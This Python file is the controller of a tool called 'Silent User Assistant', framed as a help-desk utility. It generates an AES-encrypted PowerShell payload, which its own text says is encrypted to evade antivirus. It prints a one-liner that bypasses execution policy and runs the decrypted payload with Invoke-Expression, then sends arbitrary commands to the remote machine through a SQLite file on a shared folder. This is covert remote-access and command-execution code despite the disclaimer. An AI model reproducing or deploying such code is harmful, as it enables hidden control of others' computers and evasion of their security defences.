
################################################################################################################
# SUA is a 'Silent User Assistant' tool developed to solve problems on users' PCs without stopping their work. #
# Help Desk Utility                                                                                            #
################################################################################################################


import os
import sqlite3
import time
import sys
from   win10toast import ToastNotifier
from   _Libraries import PowerShellAESSupport

os.system("cls")

print(  
    """
    ███████╗██╗██╗     ███████╗███╗   ██╗████████╗    ██╗   ██╗███████╗███████╗██████╗      █████╗ ███████╗███████╗██╗███████╗████████╗ █████╗ ███╗   ██╗████████╗
    ██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝    ██║   ██║██╔════╝██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██║██╔════╝╚══██╔══╝██╔══██╗████╗  ██║╚══██╔══╝
    ███████╗██║██║     █████╗  ██╔██╗ ██║   ██║       ██║   ██║███████╗█████╗  ██████╔╝    ███████║███████╗███████╗██║███████╗   ██║   ███████║██╔██╗ ██║   ██║   
    ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║       ██║   ██║╚════██║██╔══╝  ██╔══██╗    ██╔══██║╚════██║╚════██║██║╚════██║   ██║   ██╔══██║██║╚██╗██║   ██║   
    ███████║██║███████╗███████╗██║ ╚████║   ██║       ╚██████╔╝███████║███████╗██║  ██║    ██║  ██║███████║███████║██║███████║   ██║   ██║  ██║██║ ╚████║   ██║   
    ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝        ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝ v. 2.0
                                                                                                                                Developer: https://github.com/FebVeg
    """
)


CURRENT_PATH            = sys.path[0]
PATH_TOSAVE_KEY         = os.environ['LOCALAPPDATA'] + "\\" + "Temp" + "\\" + "SUA_client.key"
PATH_TEMPORALY_CODE     = os.environ['LOCALAPPDATA'] + "\\" + "Temp" + "\\" + "SUA_client.txt"
PATH_POWERSHELL_CODE    = CURRENT_PATH + "\\_Resources\\_InsideSharedFolder\\SUA_Powershell.txt"
PATH_POWERSHELL_CODE_TG = CURRENT_PATH + "\\_Resources\\_OverInternet\\SUA_TG_Powershell.txt"
PATH_VBS                = CURRENT_PATH + "\\_Resources\\LauncherCode.vbs"
USERNAME                = 'Controller'
TOASTER                 = ToastNotifier()


def connection_point_within_an_accessible_network_shared_folder():
    global connection_point
    global payload
    global encryption_key
    global encryption_iv

    print("Usage:")
    print("Option 1 -> [if you already have an existing connection point drag the file in here]")
    print("Option 2 -> [if you don't have a connection point already created enter here the full path of the folder (shared network folder) to create one]")
    print("-- Two files without extension will be created:")
    print("-- 1) SUA_datalog")
    print("-- 2) SUA_client")
    print("-- The first file is the database, which is the connection point. Once created it cannot be moved.")
    print("-- The second file is the payload to be run by the remote computer. The payload content will be encrypted to evade antivirus as it is an unsigned powershell script and therefore considered insecure.")
    print("-- A powershell command will be generated to run the encrypted payload.")
    print("!! SUA was created to help users in difficulty, I do not consider myself responsible for any illegal use of this program.")
    print("Current location 👉 [{0}]".format(CURRENT_PATH))

    connection_point_request = input("-> ")

    if os.path.isdir(connection_point_request):
        print("The payload is being created...")

        print("Creation of paths...")
        connection_point        = connection_point_request + "\\" + 'SUA_datalog'
        payload                 = connection_point_request + "\\" + 'SUA_client'

        print("Creation of Encryption and Decryption methods...")
        encryption      = PowerShellAESSupport.generate_key()                                   # generation of IV and KEY
        print("Recovering KEY and IV...")
        encryption_key  = "@({0})".format(encryption[0])                                        # get KEY
        encryption_iv   = "@({0})".format(encryption[1])                                        # get IV
        
        print("Realization of payload...")
        payload_code    = open(PATH_POWERSHELL_CODE).read()                                     # get the powershell code for generated a new one
        payload_code    = payload_code.replace('"@key"', encryption_key)                        # replace @key with KEY
        payload_code    = payload_code.replace('"@iv"',  encryption_iv)                         # replace @iv with IV
        payload_code    = payload_code.replace("@path",  connection_point)                      # replace @path with the connection point path
        
        print(f"Saving cleared payload on [{PATH_TEMPORALY_CODE}]")
        create_connection_point_payload = open(PATH_TEMPORALY_CODE, "w")                        # create a new temp file that contains the cleaned code
        create_connection_point_payload.write(payload_code)                                     # write into payload file the powershell code generated
        create_connection_point_payload.close()                                                 # close the file and save it
        
        print("Encrypting the powershell payload code...")
        encrypted_payload = PowerShellAESSupport.encrypt_content_of_file(PATH_TEMPORALY_CODE)   # replace actual code generated to an encrypted code
        print("Saving encrypted payload...")
        create_encrypted_payload = open(payload, 'w')                                           # opening a new file
        create_encrypted_payload.write(encrypted_payload)                                       # writing into it the encrypted powershell code
        create_encrypted_payload.close()                                                        # save it 
        
        if os.path.exists(payload):
            print(f"Payload has been created. [{payload}] ✔")
        else:
            print("Payload was not created")
            connection_point_within_an_accessible_network_shared_folder()
        
        print(f"Saving encryption data...")
        keyfile = open(PATH_TOSAVE_KEY, 'w')                            # create a new file that will contain KEY and IV
        keyfile.write("{0}\n{1}".format(encryption_key, encryption_iv)) # write them in it
        keyfile.close()                                                 # close it
        
        if os.path.exists(PATH_TOSAVE_KEY):
            print(f"Encryption data saved on [{PATH_TOSAVE_KEY}] ✔")
        else:
            print("Encryption data was not saved 🤔")

        print(f"Removing cleared payload from [{PATH_TEMPORALY_CODE}]")
        os.unlink(PATH_TEMPORALY_CODE)
        if os.path.exists(PATH_TEMPORALY_CODE):
            print(f"There was a trouble removing [{PATH_TEMPORALY_CODE}]")
        else:
            print("Removed ✔")
            
        ___ = '-'*50
        print(___, "[EXECUTE THESE COMMANDS IN THE REMOTE COMPUTER POWERSHELL]", ___, '\n')
        print(
            f"""
            Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; 
            $encrypted = Get-Content -Path "{payload}" -Raw; 
            $secureObject = ConvertTo-SecureString -String $encrypted -Key @(2,3,1,4,54,32,144,23,5,3,1,41,36,31,18,175,6,17,1,9,5,1,76,23); 
            $decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject); 
            $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted); 
            Invoke-Expression $decrypted
            """.replace('            ', '').replace('\n', '')
        )
        print('\n', ___, "[EXECUTE THESE COMMANDS IN THE REMOTE COMPUTER POWERSHELL]", ___)

        print("Waiting until connection point is created... ⏲")
        wait = 1                                                    # starting number seconds to wait
        while not os.path.exists(connection_point):                 # while until connection point will be created
            time.sleep(wait)                                        # wait number x of seconds
            wait += 0.1                                             # enlarge the number of time so as not to thwart the use of the network
        
        print("Connecting to connection point...")
        connection_to_db = sqlite3.connect(connection_point)        # connection to connection point db
        TOASTER.show_toast("Silent User Assistant", "Connected to the connection point! 😎")  
        print("Connected!")
        return connection_to_db

    elif os.path.isfile(connection_point_request):
        if os.path.exists(PATH_TOSAVE_KEY):
            print("Setting up the Key and IV saved from last time...")
            encryption = open(PATH_TOSAVE_KEY).readlines()
            encryption_key  = encryption[0]
            encryption_iv   = encryption[1]
            print("Key recovered! 😎")

        print("Connecting to an existing connection point...")
        connection_point = connection_point_request
        sql_connection_to_point = sqlite3.connect(connection_point_request)
        TOASTER.show_toast("Silent User Assistant", "Connected to the connection point! 😎")
        print("Connected!")
        return sql_connection_to_point

    else:
        print("\n❌ Something went wrong with this path!\n")
        connection_point_within_an_accessible_network_shared_folder()


def waiting_for_new_records():
    try:
        global cursor, connection, connection_point, encryption_key
        print("Waiting for new records... ⏲\n")
        wait = 0.5
        while os.path.exists(connection_point):
            time.sleep(wait)
            request = cursor.execute("SELECT * FROM SUA ORDER BY id DESC LIMIT 1")
            for records in request.fetchall():
                if not records[1] == USERNAME:
                    record = PowerShellAESSupport.decrypt(records[2], encryption_key)
                    print("# output length [{0}]".format(len(record)))
                    if wait > 2.0:
                        TOASTER.show_toast("Silent User Assistant", "Response obtained! 🤪")
                    return record
                else:
                    wait += 0.1
        wait = 0.5
    except KeyboardInterrupt:
        print("[CTRL + C] Detected")
        send_command_to_connection_point()


def send_command_to_connection_point():
    global cursor
    global connection
    global payload
    global encryption_iv
    global encryption_key

    try:
        command = input("$ ")
        if len(command) > 0:
            command_encrypted = PowerShellAESSupport.encrypt(command, encryption_key, encryption_iv)
            if len(command_encrypted) == 0:
                print("❌  Got a trouble with encryption support file")
            else:
                cursor.execute("INSERT INTO SUA (uname, record) VALUES ('{0}', '{1}')".format(USERNAME, command_encrypted))
                connection.commit()

                if command == 'exit':
                    sys.exit(0)

                print(waiting_for_new_records())
        else:
            send_command_to_connection_point()
        
        send_command_to_connection_point()
    except KeyboardInterrupt:
        print("[CTRL + C] Detected")
        sys.exit(0)
    except Exception as error:
        print(str(error))
        send_command_to_connection_point()


def graphical_user_interface():
    import tkinter

    app = tkinter.Tk()
    app.title("SUA - Silent User Assistant - Feb - 2.0")
    
    app.mainloop()


def main():
    global cursor
    global connection
    
    try:
        connection = connection_point_within_an_accessible_network_shared_folder()
        cursor = connection.cursor()
        send_command_to_connection_point()
    except Exception as error:
        print(str(error))
        main()
 

if "__main__" == __name__:
    main()
